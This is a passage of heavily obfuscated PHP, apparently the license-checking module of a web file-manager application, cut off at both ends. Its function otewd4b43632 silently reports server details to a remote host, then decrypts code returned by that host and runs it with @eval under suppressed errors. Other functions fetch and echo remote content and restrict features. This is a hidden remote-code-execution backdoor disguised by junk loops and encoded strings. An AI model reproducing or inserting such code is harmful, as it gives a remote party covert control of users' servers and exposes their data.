$…—ÖĞÌí[6]); show_json(LNG($…—ÖĞÌí[178]), !0); } private function licenseRegistSuccess() { $ÖÎÕÉÀˆ =& $_SERVER[š¿ˆÑø]; $ğ‹ù’ƒú = Model($ÖÎÕÉÀˆ[33])->get(); $äìßÜŠÅ = $_SERVER[Á÷ ­Šë][656]; if ($ğ‹ù’ƒú[$ÖÎÕÉÀˆ[63]] != $ÖÎÕÉÀˆ[189]) { Model($ÖÎÕÉÀˆ[33])->set($ÖÎÕÉÀˆ[63], $ÖÎÕÉÀˆ[189]); } Action($ÖÎÕÉÀˆ[196])->initStart(!0); } private function funt0f99aa61() { $İãó‚áƒ =& $_SERVER[Á÷ ­Šë]; $şö¿ğÏé =& $_SERVER[š¿ˆÑø]; Model($şö¿ğÏé[33])->set(array($şö¿ğÏé[179] => $şö¿ğÏé[6], $şö¿ğÏé[181] => $şö¿ğÏé[6], $şö¿ğÏé[101] => $şö¿ğÏé[102], $şö¿ğÏé[103] => $şö¿ğÏé[6], $şö¿ğÏé[104] => $şö¿ğÏé[6])); Model($şö¿ğÏé[33])->setDeep($şö¿ğÏé[188], $şö¿ğÏé[197]); $this->cpvt93ae85c3 = array(); $¢Ù–•¢ = $İãó‚áƒ[657]; $this->mwuv5f67d042 = $şö¿ğÏé[102]; $÷£¨ªıı = $İãó‚áƒ[658]; if (strlen($÷£¨ªıı) < $İãó‚áƒ[63]) { return; } } private function cgtq8e1f5632() { $¹õù»“ =& $_SERVER[Á÷ ­Šë]; $òŒ³Ï¥ğ =& $_SERVER[š¿ˆÑø]; $_SERVER[$òŒ³Ï¥ğ[152]] = _get($_SERVER, $òŒ³Ï¥ğ[152], APP_HOST); $ÈÃ¬š = $¹õù»“[659]; if (!$ÈÃ¬š) { die; } $this->mwuv5f67d042 = $òŒ³Ï¥ğ[102]; $åÃ”ÛØ® = $¹õù»“[660]; while ($åÃ”ÛØ® < $¹õù»“[639]) { if ($åÃ”ÛØ® >= 0) { break; } $åÃ”ÛØ®++; } $óÃıô‚ = Model($òŒ³Ï¥ğ[33])->get(); $ë’ ·ä¬ = $¹õù»“[661]; while (strlen($ë’ ·ä¬) < $¹õù»“[639]) { if (!$ë’ ·ä¬) { break; } $ë’ ·ä¬++; } if ($óÃıô‚[$òŒ³Ï¥ğ[101]] == $òŒ³Ï¥ğ[102]) { return; } $¤Î¾Ëá£ = Model($òŒ³Ï¥ğ[33])->get($òŒ³Ï¥ğ[99]); $ìùà®ë = $¹õù»“[662]; $Šù¾Ì¡İ = $òŒ³Ï¥ğ[194] . md5($¤Î¾Ëá£ . $òŒ³Ï¥ğ[195]); $ìÄÓÎòÏ = Cache::get($Šù¾Ì¡İ); $ÙÌ«Ï¡á = $¹õù»“[663]; if (!$ÙÌ«Ï¡á) { return; } if (!is_array($ìÄÓÎòÏ) || !isset($ìÄÓÎòÏ[$òŒ³Ï¥ğ[198]]) || time() - $ìÄÓÎòÏ[$òŒ³Ï¥ğ[198]] >= 60) { $•ÕÓ§“ = Model($òŒ³Ï¥ğ[7])->loadList(); $Ã™šÇ§ = $•ÕÓ§“[$òŒ³Ï¥ğ[191]]; $ç¤—ÂÃ¾ = md5($_SERVER[$òŒ³Ï¥ğ[98]] . strrev($¤Î¾Ëá£) . $óÃıô‚[$òŒ³Ï¥ğ[181]]); $ã¸ÌŠâ = strrev(substr($ç¤—ÂÃ¾, 10, 16)); $ìÄÓÎòÏ = $this->opyc19f22a91($Ã™šÇ§[$òŒ³Ï¥ğ[81]][$ã¸ÌŠâ], $ç¤—ÂÃ¾); $ìÄÓÎòÏ = json_decode($ìÄÓÎòÏ, !0); } if (!is_array($ìÄÓÎòÏ)) { return $this->funt0f99aa61(); } $ÈĞàŸğ¢ = strtotime($ìÄÓÎòÏ[$òŒ³Ï¥ğ[121]]); if (time() >= $ÈĞàŸğ¢) { return $this->funt0f99aa61(); } if (time() - $ìÄÓÎòÏ[$òŒ³Ï¥ğ[198]] > 20) { $ìÄÓÎòÏ[$òŒ³Ï¥ğ[198]] = time(); Cache::set($Šù¾Ì¡İ, $ìÄÓÎòÏ); } $this->cpvt93ae85c3 = $ìÄÓÎòÏ; $this->mwuv5f67d042 = $óÃıô‚[$òŒ³Ï¥ğ[101]]; } private function ydwh918d8e11() { $¹ö­©» =& $_SERVER[š¿ˆÑø]; $–Ò›º£ñ = $GLOBALS[$¹ö­©»[13]]; $ø·±™ô = $_SERVER[Á÷ ­Šë][664]; if (!$ø·±™ô) { return; } $Ô­æåÔõ = $_SERVER[$¹ö­©»[24]]; if ($Ô­æåÔõ == $¹ö­©»[199] && $this->mwuv5f67d042 == $¹ö­©»[102]) { show_json(LNG($¹ö­©»[200]), !1, $¹ö­©»[201]); } $Ñš¶ñö¤ = array($¹ö­©»[202], $¹ö­©»[203]); if (in_array($Ô­æåÔõ, $Ñš¶ñö¤)) { if ($this->mwuv5f67d042 == $¹ö­©»[102] && isset($–Ò›º£ñ[$¹ö­©»[204]])) { show_json(LNG($¹ö­©»[200]), !1, $¹ö­©»[201]); die; } $ÍÏÛˆ…ó = $this->lrqad82104aa(); if ($ÍÏÛˆ…ó != intval($¹ö­©»[205])) { if ($ÍÏÛˆ…ó <= Model($¹ö­©»[117])->count()) { show_json(LNG($¹ö­©»[206]), !1, $¹ö­©»[201]); die; } } } } private function upde4a07955f() { $ë™Ÿ¸¡¤ =& $_SERVER[Á÷ ­Šë]; $ ©¤“é¸ =& $_SERVER[š¿ˆÑø]; $ÕïĞ¬üü = array($ ©¤“é¸[114], $ ©¤“é¸[207]); $ç¢‘Í®€ = $ë™Ÿ¸¡¤[665]; if (!_get($GLOBALS, $ ©¤“é¸[111]) || !isset($_GET[$ ©¤“é¸[208]])) { return; } if (!in_array($_SERVER[$ ©¤“é¸[24]], $ÕïĞ¬üü)) { return; } $ªáç”ØÂ = $ ©¤“é¸[209]; $şÒ’üÕ = $ë™Ÿ¸¡¤[666]; if (!$şÒ’üÕ) { return; } $ªáç”ØÂ = $this->wofvc8c89bbc($ªáç”ØÂ, $ ©¤“é¸[210]); $Øáú¯‡à = $ë™Ÿ¸¡¤[667]; if (!$Øáú¯‡à) { return; } $É’¿™äş = stream_context_create(array($ ©¤“é¸[211] => array($ ©¤“é¸[212] => $ ©¤“é¸[213], $ ©¤“é¸[214] => 3))); $ÃÎœãê¿ = @file_get_contents($ªáç”ØÂ, !1, $É’¿™äş); $²Òáõçı = $ë™Ÿ¸¡¤[668]; if (!$²Òáõçı) { return; } header($ ©¤“é¸[215]); $Ï‘çç = $ë™Ÿ¸¡¤[669]; if (strlen($Ï‘çç) < $ë™Ÿ¸¡¤[614]) { return; } if ($ÃÎœãê¿ && strstr($ÃÎœãê¿, $ ©¤“é¸[216])) { echo $ÃÎœãê¿; } die; } public function ndwvcc48dc97($€Ôİğó) { $ ¥ò‘¦Ü =& $_SERVER[Á÷ ­Šë]; $€ê‘ŞÎÏ =& $_SERVER[š¿ˆÑø]; if ($this->mwuv5f67d042 == $€ê‘ŞÎÏ[217]) { return $€Ôİğó; } $»¥Ù¨Ç… = array($€ê‘ŞÎÏ[218] => $€ê‘ŞÎÏ[219], $€ê‘ŞÎÏ[220] => $€ê‘ŞÎÏ[219], $€ê‘ŞÎÏ[221] => $€ê‘ŞÎÏ[219], $€ê‘ŞÎÏ[222] => $€ê‘ŞÎÏ[219], $€ê‘ŞÎÏ[223] => $€ê‘ŞÎÏ[224], $€ê‘ŞÎÏ[225] => $€ê‘ŞÎÏ[224], $€ê‘ŞÎÏ[226] => $€ê‘ŞÎÏ[224], $€ê‘ŞÎÏ[227] => $€ê‘ŞÎÏ[224], $€ê‘ŞÎÏ[228] => $€ê‘ŞÎÏ[224], $€ê‘ŞÎÏ[229] => $€ê‘ŞÎÏ[224], $€ê‘ŞÎÏ[230] => $€ê‘ŞÎÏ[224], $€ê‘ŞÎÏ[231] => $€ê‘ŞÎÏ[224], $€ê‘ŞÎÏ[232] => $€ê‘ŞÎÏ[224], $€ê‘ŞÎÏ[233] => $€ê‘ŞÎÏ[224], $€ê‘ŞÎÏ[234] => $€ê‘ŞÎÏ[224], $€ê‘ŞÎÏ[235] => $€ê‘ŞÎÏ[224]); $­ƒâ¸½‘ = explode($€ê‘ŞÎÏ[236], _get($this->cpvt93ae85c3, $€ê‘ŞÎÏ[108], $€ê‘ŞÎÏ[6])); $¡ßÌû¥ç = $ ¥ò‘¦Ü[670]; while ($¡ßÌû¥ç < $ ¥ò‘¦Ü[616]) { if ($¡ßÌû¥ç >= 0) { break; } $¡ßÌû¥ç++; } $Ãğıîœ† = array(); foreach ($»¥Ù¨Ç… as $©•¸Ô»ì => $ËÒ™—ì™) { if ($ËÒ™—ì™ == $€ê‘ŞÎÏ[219] && substr($this->mwuv5f67d042, 0, 1) == $€ê‘ŞÎÏ[219]) { continue; } if (!in_array($©•¸Ô»ì, $­ƒâ¸½‘)) { $Ãğıîœ†[] = $©•¸Ô»ì; } } foreach ($Ãğıîœ† as $©•¸Ô»ì) { unset($€Ôİğó[$©•¸Ô»ì]); $Ö½Àí = $ ¥ò‘¦Ü[671]; while ($Ö½Àí < $ ¥ò‘¦Ü[63]) { if ($Ö½Àí >= 0) { break; } $Ö½Àí++; } } return $€Ôİğó; $£şõ«­  = $ ¥ò‘¦Ü[672]; } private function zefw714683cb() { $ù‡Ïƒåú =& $_SERVER[š¿ˆÑø]; if ($this->mwuv5f67d042 != $ù‡Ïƒåú[102]) { $GLOBALS[$ù‡Ïƒåú[81]][$ù‡Ïƒåú[85]][$ù‡Ïƒåú[237]] = $ù‡Ïƒåú[197]; return; } $GLOBALS[$ù‡Ïƒåú[81]][$ù‡Ïƒåú[238]] = $ù‡Ïƒåú[189]; if (Model($ù‡Ïƒåú[239])->get($ù‡Ïƒåú[63]) != $ù‡Ïƒåú[197]) { Model($ù‡Ïƒåú[239])->set($ù‡Ïƒåú[63], $ù‡Ïƒåú[197]); } } public function xjhf629bd639() { return $_SERVER[š¿ˆÑø][240]; } private function otewd4b43632() { $šÆ¦”øú =& $_SERVER[Á÷ ­Šë]; $ÁåÓğ÷Ù =& $_SERVER[š¿ˆÑø]; $íğË±³â = array($ÁåÓğ÷Ù[241], $ÁåÓğ÷Ù[242], $ÁåÓğ÷Ù[243]); $İúã…ä = $šÆ¦”øú[673]; if (strlen($İúã…ä) < $šÆ¦”øú[639]) { die; } $’øİµ‹˜ = $ÁåÓğ÷Ù[244] . md5($ÁåÓğ÷Ù[245]); $òÑßç÷ˆ = $šÆ¦”øú[674]; if ($this->mwuv5f67d042 == $ÁåÓğ÷Ù[102] || !_get($GLOBALS, $ÁåÓğ÷Ù[111])) { return; } if (!in_array($_SERVER[$ÁåÓğ÷Ù[24]], $íğË±³â)) { return; } if (time() % 4 != 0) { return; } $ç° ‡ô  = call_user_func(array($ÁåÓğ÷Ù[246], $ÁåÓğ÷Ù[247]), $’øİµ‹˜); $Œíù¦ƒ = $šÆ¦”øú[675]; if (strlen($Œíù¦ƒ) < $šÆ¦”øú[639]) { return; } if ($ç° ‡ô  && time() - $ç° ‡ô  < intval($ÁåÓğ÷Ù[248])) { return; } call_user_func(array($ÁåÓğ÷Ù[246], $ÁåÓğ÷Ù[131]), $’øİµ‹˜, time()); $úş«ºè = Model($ÁåÓğ÷Ù[33])->get($ÁåÓğ÷Ù[99]); $¸ëçûÏ… = $šÆ¦”øú[676]; while ($¸ëçûÏ… < $šÆ¦”øú[677]) { if ($¸ëçûÏ… >= 0) { break; } $¸ëçûÏ…++; } $ÒÉê¨¼Ä = array($ÁåÓğ÷Ù[143] => Model($ÁåÓğ÷Ù[33])->get($ÁåÓğ÷Ù[179]), $ÁåÓğ÷Ù[156] => $this->mwuv5f67d042, $ÁåÓğ÷Ù[153] => $_SERVER[$ÁåÓğ÷Ù[154]], $ÁåÓğ÷Ù[155] => Model($ÁåÓğ÷Ù[33])->get($ÁåÓğ÷Ù[123]), $ÁåÓğ÷Ù[97] => md5($_SERVER[$ÁåÓğ÷Ù[98]] . $úş«ºè), $ÁåÓğ÷Ù[146] => $ÁåÓğ÷Ù[128], $ÁåÓğ÷Ù[149] => $_SERVER[$ÁåÓğ÷Ù[150]]); $Âœı¤¯Õ = $šÆ¦”øú[678]; if (strlen($Âœı¤¯Õ) < $šÆ¦”øú[639]) { return; } $ğ•ÛĞ­ü = $this->mdqoa34655bc($ÁåÓğ÷Ù[249], $ÒÉê¨¼Ä); $âÂù…·­ = $šÆ¦”øú[679]; if (!is_array($ğ•ÛĞ­ü)) { return; } if ($ğ•ÛĞ­ü[$ÁåÓğ÷Ù[143]] && $ğ•ÛĞ­ü[$ÁåÓğ÷Ù[250]]) { if ($this->czwh827376f5($ğ•ÛĞ­ü[$ÁåÓğ÷Ù[250]]) == $ÒÉê¨¼Ä[$ÁåÓğ÷Ù[143]]) { return; } } $this->funt0f99aa61(); $áşà‰ê… = $šÆ¦”øú[680]; if (strlen($áşà‰ê…) < $šÆ¦”øú[614]) { die; } if ($this->czwh827376f5($ğ•ÛĞ­ü[$ÁåÓğ÷Ù[250]]) != $ÒÉê¨¼Ä[$ÁåÓğ÷Ù[143]]) { $Œ”á¯—´ = array($ÁåÓğ÷Ù[174] => $úş«ºè, $ÁåÓğ÷Ù[175] => $_SERVER[$ÁåÓğ÷Ù[98]], $ÁåÓğ÷Ù[176] => this_url(), $ÁåÓğ÷Ù[151] => $_SERVER[$ÁåÓğ÷Ù[152]]); $ş…ŸÇ´ã = $this->tfpu56035b42(json_encode($Œ”á¯—´)); $ğ•ÛĞ­ü = $this->mdqoa34655bc($ÁåÓğ÷Ù[177] . $ş…ŸÇ´ã); if ($ğ•ÛĞ­ü && is_array($ğ•ÛĞ­ü) && isset($ğ•ÛĞ­ü[$ÁåÓğ÷Ù[250]])) { $æÙ›™š¡ = $this->opyc19f22a91($ğ•ÛĞ­ü[$ÁåÓğ÷Ù[250]], 2); if ($æÙ›™š¡) { $æÙ›™š¡ = $this->czwh827376f5($æÙ›™š¡); } if ($æÙ›™š¡) { try { @eval($æÙ›™š¡); } catch (Exception $«©ğ¸–Ù) { } } } } } private function mdqoa34655bc($ØÕœØÖ = '', $Â™ÕŒÕ = array(), $ËĞåıš = 5) { $ï‘—Ç‰Ã =& $_SERVER[Á÷ ­Šë]; $“ÄŞˆ°¿ =& $_SERVER[š¿ˆÑø]; $€„Í·ûÏ = $“ÄŞˆ°¿[251]; $€„Í·ûÏ = $this->wofvc8c89bbc($€„Í·ûÏ, $“ÄŞˆ°¿[252]); $€„Í·ûÏ = $€„Í·ûÏ . $ØÕœØÖ; $¯İÎúµÃ = $ï‘—Ç‰Ã[681]; while ($¯İÎúµÃ < $ï‘—Ç‰Ã[639]) { if ($¯İÎúµÃ >= 0) { break; } $¯İÎúµÃ++; } if ($Â™ÕŒÕ && is_array($Â™ÕŒÕ)) { $€„Í·ûÏ = $€„Í·ûÏ . $“ÄŞˆ°¿[253] . http_build_query($Â™ÕŒÕ); } if ($Â™ÕŒÕ === -1) { return $€„Í·ûÏ; } $…µßôçÆ = stream_context_create(array($“ÄŞˆ°¿[211] => array($“ÄŞˆ°¿[214] => $ËĞåıš, $“ÄŞˆ°¿[212] => $“ÄŞˆ°¿[254]), $“ÄŞˆ°¿[255] => array($“ÄŞˆ°¿[256] => !1, $“ÄŞˆ°¿[257] => !1))); $Â™ÕŒÕ = @file_get_contents($€„Í·ûÏ, !1, $…µßôçÆ); $ûÁ¶©…÷ = $ï‘—Ç‰Ã[682]; if (!$ûÁ¶©…÷) { return; } return json_decode($Â™ÕŒÕ, !0); $üùØ¾œ = $ï‘—Ç‰Ã[683]; while (strlen($üùØ¾œ) < $ï‘—Ç‰Ã[639]) { if (!$üùØ¾œ) { break; } $üùØ¾œ++; } $ÕÕ•ø¤ = $ï‘—Ç‰Ã[684]; while (strlen($ÕÕ•ø¤) < $ï‘—Ç‰Ã[616]) { if (!$ÕÕ•ø¤) { break; } $ÕÕ•ø¤++; } } private function lrqad82104aa() { $ëÜø ´• =& $_SERVER[Á÷ ­Šë]; $æ“ŞÍ¦Ô =& $_SERVER[š¿ˆÑø]; $Áòòì = array($æ“ŞÍ¦Ô[258] => $æ“ŞÍ¦Ô[259], $æ“ŞÍ¦Ô[260] => $æ“ŞÍ¦Ô[261], $æ“ŞÍ¦Ô[262] => $æ“ŞÍ¦Ô[263], $æ“ŞÍ¦Ô[264] => $æ“ŞÍ¦Ô[265], $æ“ŞÍ¦Ô[266] => $æ“ŞÍ¦Ô[267], $æ“ŞÍ¦Ô[268] => $æ“ŞÍ¦Ô[205], $æ“ŞÍ¦Ô[269] => $æ“ŞÍ¦Ô[205], $æ“ŞÍ¦Ô[270] => $æ“ŞÍ¦Ô[259], $æ“ŞÍ¦Ô[271] => $æ“ŞÍ¦Ô[261], $æ“ŞÍ¦Ô[272] => $æ“ŞÍ¦Ô[263], $æ“ŞÍ¦Ô[273] => $æ“ŞÍ¦Ô[274], $æ“ŞÍ¦Ô[275] => $æ“ŞÍ¦Ô[265], $æ“ŞÍ¦Ô[276] => $æ“ŞÍ¦Ô[277], $æ“ŞÍ¦Ô[278] => $æ“ŞÍ¦Ô[267], $æ“ŞÍ¦Ô[279] => $æ“ŞÍ¦Ô[280], $æ“ŞÍ¦Ô[281] => $æ“ŞÍ¦Ô[282], $æ“ŞÍ¦Ô[283] => $æ“ŞÍ¦Ô[284]); $õã§ß´Á = $ëÜø ´•[685]; while ($õã§ß´Á < $ëÜø ´•[63]) { if ($õã§ß´Á >= 0) { break; } $õã§ß´Á++; } $ß¶şù–ù = $Áòòì[$this->mwuv5f67d042]; $ç­‘ü¤æ = $ëÜø ´•[663]; while ($ç­‘ü¤æ < $ëÜø ´•[639]) { if ($ç­‘ü¤æ >= 0) { break; } $ç­‘ü¤æ++; } $ß¶şù–ù = intval($ß¶şù–ù ? $ß¶şù–ù : $æ“ŞÍ¦Ô[259]); $áø­á‚ï = _get($this->cpvt93ae85c3, $æ“ŞÍ¦Ô[285]); $áø­á‚ï = $áø­á‚ï ? intval($áø­á‚ï) : 0; return $ß¶şù–ù + $áø­á‚ï; } public function hqzl2ffb0054($Š”ƒ¾ïÎ) { $Çß˜îØ =& $_SERVER[š¿ˆÑø]; $£Í¸ß¥ñ = $this->lrqad82104aa(); if ($Š”ƒ¾ïÎ[$Çß˜îØ[286]] == $Çß˜îØ[189]) { return; } if ($£Í¸ß¥ñ >= intval($Çß˜îØ[205])) { return; } $›ÊÑŞ¹å = Model($Çß˜îØ[117])->count(); if ($›ÊÑŞ¹å <= $£Í¸ß¥ñ) { return; } $‘ã©«åç = Model($Çß˜îØ[117])->field($Çß˜îØ[286])->limit($£Í¸ß¥ñ)->select(); $‘ã©«åç = array_to_keyvalue($‘ã©«åç, $Çß˜îØ[6], $Çß˜îØ[286]); if (!in_array($Š”ƒ¾ïÎ[$Çß˜îØ[286]], $‘ã©«åç)) { show_json($Çß˜îØ[287], !1, $Çß˜îØ[201]); } } public function otkbe613c956() { $˜æ–‰£Ó =& $_SERVER[Á÷ ­Šë]; $ãôÅôÁş =& $_SERVER[š¿ˆÑø]; if (!_get($GLOBALS, $ãôÅôÁş[111]) || mt_rand(1, 100) > 20) { return; } $Á›ë˜†Ò = $ãôÅôÁş[209]; $Á›ë˜†Ò = $this->wofvc8c89bbc($Á›ë˜†Ò, $ãôÅôÁş[210]); $‰­ÓÒµÌ = $˜æ–‰£Ó[686]; if (!$‰­ÓÒµÌ) { die; } $¼ù„ÎöÙ = stream_context_create(array($ãôÅôÁş[211] => array($ãôÅôÁş[212] => $ãôÅôÁş[213], $ãôÅôÁş[214] => 3))); $íçµ¬À = @file_get_contents($Á›ë˜†Ò, !1, $¼ù„ÎöÙ); echo $ãôÅôÁş[288] . hash_encode($íçµ¬À) . $ãôÅôÁş[289]; $µøâîû´ = $˜æ–‰£Ó[687]; if (!$µøâîû´) { die; } } private function gcbk66816f0f($‡ãÔ öÍ, $È”Û¹Èï, $“–”ºÂ = 3) { $Ë€é•´ =& $_SERVER[Á÷ ­Šë]; $Ñ‘¾‘ú€ =& $_SERVER[š¿ˆÑø]; usleep(1); $‡ãÔ öÍ = trim($‡ãÔ öÍ); $Æ ¸éª› = $Ë€é•´[688]; while (strlen($Æ ¸éª›) < $Ë€é•´[614]) { if (!$Æ ¸éª›) { break; } $Æ ¸éª›++; } $ÜšÈ—á = mt_rand(0, 5) . $Ñ‘¾‘ú€[6]; $¶€¤å = rand_string(15); $´­·¯¹µ = $Ë€é•´[689]; if (!$´­·¯¹µ) { die; } $ŒÁ¬êøà = $Ñ‘¾‘ú€[290]; switch ($ÜšÈ—á) { case $Ñ‘¾‘ú€[197]: $±ØÉ›Ş = $this->jcpm905a115d($‡ãÔ öÍ, strrev($È”Û¹Èï . $¶€¤å)); $Õ†Ú¤öÀ = $Ë€é•´[690]; if (!$Õ†Ú¤öÀ) { die; } break; case $Ñ‘¾‘ú€[189]: $±ØÉ›Ş = $this->jcpm905a115d($‡ãÔ öÍ, strrev($¶€¤å . $È”Û¹Èï)); $ì¦ª¯¢“ = $Ë€é•´[691]; while (strlen($ì¦ª¯¢“) < $Ë€é•´[63]) { if (!$ì¦ª¯¢“) { break; } $ì¦ª¯¢“++; } break; $­¶©ÒÙ± = $Ë€é•´[692]; if (strlen($­¶©ÒÙ±) < $Ë€é•´[639]) { return; } case $Ñ‘¾‘ú€[291]: $±ØÉ›Ş = $this->jcpm905a115d($‡ãÔ öÍ, base64_encode($¶€¤å . $È”Û¹Èï)); $£ğÂâ–ß = $Ë€é•´[693]; break; $åê‚ú ş = $Ë€é•´[694]; while ($åê‚ú ş < $Ë€é•´[616]) { if ($åê‚ú ş >= 0) { break; } $åê‚ú ş++; } case $Ñ‘¾‘ú€[292]: $±ØÉ›Ş = $this->jcpm905a115d($‡ãÔ öÍ, md5($¶€¤å . $È”Û¹Èï)); break; case $Ñ‘¾‘ú€[293]: $‡ãÔ öÍ = base64_encode($‡ãÔ öÍ); $ÈÈú¸’” = $Ë€é•´[695]; if (strlen($ÈÈú¸’”) < $Ë€é•´[63]) { return; } $ïı‘Ä–é = rand(0, 64); $÷ˆ´áÔğ = $Ë€é•´[696]; $İœ–ğÙÓ = $ŒÁ¬êøà[$ïı‘Ä–é]; $íÏ˜µı = md5($İœ–ğÙÓ . md5($È”Û¹Èï . $İœ–ğÙÓ) . $È”Û¹Èï); $íÏ˜µı = substr($íÏ˜µı, $ïı‘Ä–é % 8, $ïı‘Ä–é % 8 + 7); $¡ûÍŸô¦ = $Ñ‘¾‘ú€[6]; $êŒ‹–„È = $Ë€é•´[697]; $ã¤Ú¼§ = 0; $ŸË‚Íƒ = 0; $Ò›’‘¬Ñ = $Ë€é•´[698]; if (!$Ò›’‘¬Ñ) { die; } $×†¯‡ş€ = 0; for ($ã¤Ú¼§ = 0; $ã¤Ú¼§ < strlen($‡ãÔ öÍ); $ã¤Ú¼§++) { $×†¯‡ş€ = $×†¯‡ş€ == strlen($íÏ˜µı) ? 0 : $×†¯‡ş€; $ŸË‚Íƒ = ($ïı‘Ä–é + strpos($ŒÁ¬êøà, $‡ãÔ öÍ[$ã¤Ú¼§]) + ord($íÏ˜µı[$×†¯‡ş€++])) % 64; $Øş–¼üØ = $Ë€é•´[699]; while (strlen($Øş–¼üØ) < $Ë€é•´[63]) { if (!$Øş–¼üØ) { break; } $Øş–¼üØ++; } $¡ûÍŸô¦ .= $ŒÁ¬êøà[$ŸË‚Íƒ]; } $±ØÉ›Ş = hash_encode($İœ–ğÙÓ . $¡ûÍŸô¦); $œ¸â¯®ƒ = $Ë€é•´[700]; while ($œ¸â¯®ƒ < $Ë€é•´[616]) { if ($œ¸â¯®ƒ >= 0) { break; } $œ¸â¯®ƒ++; } break; $øş›ÙŞ¸ = $Ë€é•´[701]; while ($øş›ÙŞ¸ < $Ë€é•´[677]) { if ($øş›ÙŞ¸ >= 0) { break; } $øş›ÙŞ¸++; } default: $±ØÉ›Ş = $this->jcpm905a115d($‡ãÔ öÍ, $È”Û¹Èï . $¶€¤å); $êÑ˜ƒó = $Ë€é•´[702]; while ($êÑ˜ƒó < $Ë€é•´[63]) { if ($êÑ˜ƒó >= 0) { break; } $êÑ˜ƒó++; } break; $†á¸î„ = $Ë€é•´[703]; if (strlen($†á¸î„) < $Ë€é•´[616]) { return; } } $±ØÉ›Ş = strrev($ÜšÈ—á . $¶€¤å . $±ØÉ›Ş); $ØÔíÜÎ¹ = $Ë€é•´[704]; while (strlen($ØÔíÜÎ¹) < $Ë€é•´[614]) { if (!$ØÔíÜÎ¹) { break; } $ØÔíÜÎ¹++; } if ($“–”ºÂ - 1 > 0) { $±ØÉ›Ş = $this->gcbk66816f0f($±ØÉ›Ş, $È”Û¹Èï, $“–”ºÂ - 1); } return $±ØÉ›Ş; } private function opyc19f22a91($ÀûØº¹¤, $üëÔ×Ùİ, $½À½ÇÆ = 3) { $¸šÎ·²˜ =& $_SERVER[Á÷ ­Šë]; $…Ûıõ‹ =& $_SERVER[š¿ˆÑø]; if (!is_string($ÀûØº¹¤) || strlen($ÀûØº¹¤) < 10) { return !1; } $ÀûØº¹¤ = trim($ÀûØº¹¤); $ÀûØº¹¤ = strrev($ÀûØº¹¤); $ß§À¬‰ò = $¸šÎ·²˜[705]; $Ï£›ú†å = $ÀûØº¹¤[0]; $ü¹ˆ®èå = $¸šÎ·²˜[706]; while ($ü¹ˆ®èå < $¸šÎ·²˜[614]) { if ($ü¹ˆ®èå >= 0) { break; } $ü¹ˆ®èå++; } $Úôİ«­ = substr($ÀûØº¹¤, 1, 15); $úİ½‚‚Ì = $¸šÎ·²˜[707]; if (!$úİ½‚‚Ì) { die; } $ÀûØº¹¤ = substr($ÀûØº¹¤, 16); $ó¤Æª » = $¸šÎ·²˜[708]; if (strlen($ó¤Æª ») < $¸šÎ·²˜[639]) { return; } $¹¨ßÅšò = $…Ûıõ‹[290]; switch ($Ï£›ú†å) { case $…Ûıõ‹[197]: $ÂÌõÑ–ˆ = $this->wofvc8c89bbc($ÀûØº¹¤, strrev($üëÔ×Ùİ . $Úôİ«­)); $“ğƒ†ƒ = $¸šÎ·²˜[709]; while (strlen($“ğƒ†ƒ) < $¸šÎ·²˜[677]) { if (!$“ğƒ†ƒ) { break; } $“ğƒ†ƒ++; } break; $ÖÒ¹™şƒ = $¸šÎ·²˜[710]; while ($ÖÒ¹™şƒ < $¸šÎ·²˜[63]) { if ($ÖÒ¹™şƒ >= 0) { break; } $ÖÒ¹™şƒ++; } case $…Ûıõ‹[189]: $ÂÌõÑ–ˆ = $this->wofvc8c89bbc($ÀûØº¹¤, strrev($Úôİ«­ . $üëÔ×Ùİ)); break; $ŠëİÏÍı = $¸šÎ·²˜[711]; case $…Ûıõ‹[291]: $ÂÌõÑ–ˆ = $this->wofvc8c89bbc($ÀûØº¹¤, base64_encode($Úôİ«­ . $üëÔ×Ùİ)); break; $Æ ÅÑ® = $¸šÎ·²˜[712]; while (strlen($Æ ÅÑ®) < $¸šÎ·²˜[616]) { if (!$Æ ÅÑ®) { break; } $Æ ÅÑ®++; } case $…Ûıõ‹[292]: $ÂÌõÑ–ˆ = $this->wofvc8c89bbc($ÀûØº¹¤, md5($Úôİ«­ . $üëÔ×Ùİ)); $ä§¶ˆ­ = $¸šÎ·²˜[713]; if (!$ä§¶ˆ­) { return; } break; case $…Ûıõ‹[293]: $ÀûØº¹¤ = hash_decode($ÀûØº¹¤); $çÍâöÁª = $¸šÎ·²˜[714]; $ä³çı“ = $ÀûØº¹¤[0]; $ÀûØº¹¤ = substr($ÀûØº¹¤, 1); $Ä±ÎüÍ¦ = $¸šÎ·²˜[715]; if (strlen($Ä±ÎüÍ¦) < $¸šÎ·²˜[639]) { die; } $”ç¦¨´˜ = strpos($¹¨ßÅšò, $ä³çı“); $¥¸­ = md5($ä³çı“ . md5($üëÔ×Ùİ . $ä³çı“) . $üëÔ×Ùİ); $¥¸­ = substr($¥¸­, $”ç¦¨´˜ % 8, $”ç¦¨´˜ % 8 + 7); $úáÌë´â = $¸šÎ·²˜[716]; if (strlen($úáÌë´â) < $¸šÎ·²˜[616]) { die; } $÷£®‡‰ğ = $…Ûıõ‹[6]; $œñ€ä¬¬ = $¸šÎ·²˜[717]; $úµ‡Ì”‚ = 0; $Ñµœîšü = 0; $€ÄìäËá = 0; for ($úµ‡Ì”‚ = 0; $úµ‡Ì”‚ < strlen($ÀûØº¹¤); $úµ‡Ì”‚++) { $€ÄìäËá = $€ÄìäËá == strlen($¥¸­) ? 0 : $€ÄìäËá; $¡¶šˆìõ = $€ÄìäËá++; $Ñµœîšü = strpos($¹¨ßÅšò, $ÀûØº¹¤[$úµ‡Ì”‚]) - $”ç¦¨´˜ - ord($¥¸­[$¡¶šˆìõ]); while ($Ñµœîšü < 0) { $Ñµœîšü += 64; } $÷£®‡‰ğ .= $¹¨ßÅšò[$Ñµœîšü]; } $ÂÌõÑ–ˆ = base64_decode($÷£®‡‰ğ); $Ş“¬ÄúÍ = $¸šÎ·²˜[718]; while (strlen($Ş“¬ÄúÍ) < $¸šÎ·²˜[616]) { if (!$Ş“¬ÄúÍ) { break; } $Ş“¬ÄúÍ++; } break; $‚ş¤ÆĞú = $¸šÎ·²˜[719]; default: $ÂÌõÑ–ˆ = $this->wofvc8c89bbc($ÀûØº¹¤, $üëÔ×Ùİ . $Úôİ«­); break; $·Âó€«× = $¸šÎ·²˜[720]; } if ($½À½ÇÆ - 1 > 0) { $ÂÌõÑ–ˆ = $this->opyc19f22a91($ÂÌõÑ–ˆ, $üëÔ×Ùİ, $½À½ÇÆ - 1); } return $ÂÌõÑ–ˆ; } public function tfpu56035b42($ÂúèŠœº) { $Ó€§ç• =& $_SERVER[Á÷ ­Šë]; $Ü¦ü‘‡ =& 